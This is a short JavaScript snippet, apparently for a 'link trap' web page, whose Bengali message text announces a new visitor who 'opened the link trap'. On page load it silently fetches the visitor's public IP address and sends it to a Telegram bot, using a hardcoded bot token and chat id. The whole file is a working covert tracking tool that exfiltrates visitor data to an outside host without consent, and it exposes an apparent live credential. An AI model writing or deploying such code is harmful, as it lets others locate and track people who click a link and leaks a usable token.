document.addEventListener("DOMContentLoaded", function () {
  fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;

      // ✅ Replace with your actual token & chat_id
      const botToken = "8470662861:AAGTAap68ISTJgqBUtJsDAW0cjGXDqHbyNs";
      const chatId = "7984396110";

      const message = `🔥 নতুন ভিজিটর 🚨\n🌐 IP: ${ip}\n🧲 লিংক ট্র্যাপ খুলেছে ✅`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(response => console.log("📤 পাঠানো হয়েছে টেলিগ্রামে"))
        .catch(error => console.error("❌ ত্রুটি:", error));
    });
});
